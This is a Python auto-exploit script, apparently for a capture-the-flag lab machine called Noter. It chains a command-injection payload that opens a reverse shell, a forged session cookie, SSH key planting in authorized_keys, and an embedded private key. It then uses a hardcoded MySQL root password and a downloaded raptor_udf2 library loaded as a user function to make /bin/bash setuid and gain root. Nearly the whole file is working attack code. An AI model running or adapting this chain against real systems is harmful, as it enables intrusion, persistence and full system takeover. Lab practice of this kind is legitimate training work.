import requests
try:
    from pwn import *
    print("\n[\033[1;32m+\033[1;37m] Autopwn Noter ~ GatoGamer1155\n")
except:
    print('\n[\033[1;31m!\033[1;37m] El script necesita privilegios de root\n\n[\033[1;31m!\033[1;37m] Recuerda tener instalada la libreria pwntools\n')
    exit(1)

def kill(sig, frame):
    print("\n[\033[1;31m-\033[1;37m] Saliendo\n")
    sys.exit(1)

signal.signal(signal.SIGINT, kill)

if len(sys.argv) < 2:
    print(f"[\033[1;31m-\033[1;37m] Uso: python3 {sys.argv[0]} <ip>\n")
    exit(1)

ip = sys.argv[1]

rsa = ("-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAArAAAABNlY2RzYS\n1zaGEyLW5pc3RwNTIxAAAACG5pc3RwNTIxAAAAhQQAV+el7yuxnYFf7OIrTmrtkcCc+SIX\nB2Kx57Iy7C6tqnRt9a75XTAg+BMLS2bBVu5GOfUJmzb1MdGwS3qXjng8P2EA3x5Wbk3QKX\n53brevFwG7DTCJ+Y4w+rO7LGcUx26pNS0IOTPTlOiIAmW55vDm1X0XRVR1yQkZKAuY6JyE\nMyaO5JcAAAEQabjlkWm45ZEAAAATZWNkc2Etc2hhMi1uaXN0cDUyMQAAAAhuaXN0cDUyMQ\nAAAIUEAFfnpe8rsZ2BX+ziK05q7ZHAnPkiFwdiseeyMuwurap0bfWu+V0wIPgTC0tmwVbu\nRjn1CZs29THRsEt6l454PD9hAN8eVm5N0Cl+d263rxcBuw0wifmOMPqzuyxnFMduqTUtCD\nkz05ToiAJluebw5tV9F0VUdckJGSgLmOichDMmjuSXAAAAQgDqFgsGASYZOcTRf2U760nc\nmu4YpvT7/Q0vKEuz9l70jUalAI/F9nf08dpXjE/2/BiUNKXDvaVYUW1eFaIBu3W4aAAAAB\nJFQ0RTQSA1MjEgYml0IEtleXM=\n-----END OPENSSH PRIVATE KEY-----")
md = ("--';bash -i >& /dev/tcp/%s/443 0>&1;'--" % (ip))
os.system('echo "%s" > key' % (rsa))
os.system('echo "%s" > note.md' % (md))

def serr():
    os.system("python3 -m http.server 6000")

def cmd():
    time.sleep(1)
    target = "http://10.10.11.160:5000/export_note_remote"
    data = "url=http://"
    note = ":6000/note.md"
    headers = {"Content-Type": "application/x-www-form-urlencoded", "Cookie": "session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.Yne-gw.zGNrWtDKS5KwiL_dPe9sSOqG2A4", "Origin": "http://10.10.11.160:5000", "Referer": "http://10.10.11.160:5000/export_note", "Cache-Control": "max-age=0"}
    requests.post(target, data=data + ip + note, headers=headers, verify=False)

threading.Thread(target=serr, args=()).start()
threading.Thread(target=cmd, args=()).start()
shell = listen(443, timeout=30).wait_for_connection()
time.sleep(0.5)
shell.sendline(b"mkdir ~/.ssh;echo 'ecdsa-sha2-nistp521 AAAAE2VjZHNhLXNoYTItbmlzdHA1MjEAAAAIbmlzdHA1MjEAAACFBABX56XvK7GdgV/s4itOau2RwJz5IhcHYrHnsjLsLq2qdG31rvldMCD4EwtLZsFW7kY59QmbNvUx0bBLepeOeDw/YQDfHlZuTdApfndut68XAbsNMIn5jjD6s7ssZxTHbqk1LQg5M9OU6IgCZbnm8ObVfRdFVHXJCRkoC5jonIQzJo7klw== ECDSA 521 bit Keys' > ~/.ssh/authorized_keys")

time.sleep(0.5)
os.system("wget https://raw.githubusercontent.com/1N3/PrivEsc/master/mysql/raptor_udf2.c")
time.sleep(4)
os.system("gcc -g -c raptor_udf2.c")
time.sleep(1)
os.system("gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc")
time.sleep(1)

def server():
    os.system("python3 -m http.server 8000")

threading.Thread(target=server, args=()).start()

request = ssh(host='10.10.11.160', user='svc', keyfile='key')
shell = request.process("/bin/sh")
time.sleep(0.6)
shell.sendline("wget http://%s:8000/raptor_udf2.so" % (ip))
time.sleep(4)
shell.sendline(b"mysql -u'root' -p'Nildogg36'")
time.sleep(0.6)
shell.sendline(b"use mysql;")
time.sleep(0.6)
shell.sendline(b"create table foo(line blob);")
time.sleep(0.6)
shell.sendline(b"insert into foo values(load_file('/home/svc/raptor_udf2.so'));")
time.sleep(0.6)
shell.sendline(b"select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so';")
time.sleep(0.6)
shell.sendline(b"create function do_system returns integer soname 'raptor_udf2.so';")
time.sleep(0.6)
shell.sendline(b"select * from mysql.func;")
time.sleep(0.6)
shell.sendline(b"select do_system('chmod 4775 /bin/bash');")
time.sleep(0.6)
shell.sendline(b"exit")
time.sleep(0.6)
shell.sendline(b"bash -p")
time.sleep(0.6)
shell.sendline(b"export HOME=/root; cd; echo 'uid=0(root)'")
time.sleep(0.6)
shell.interactive()
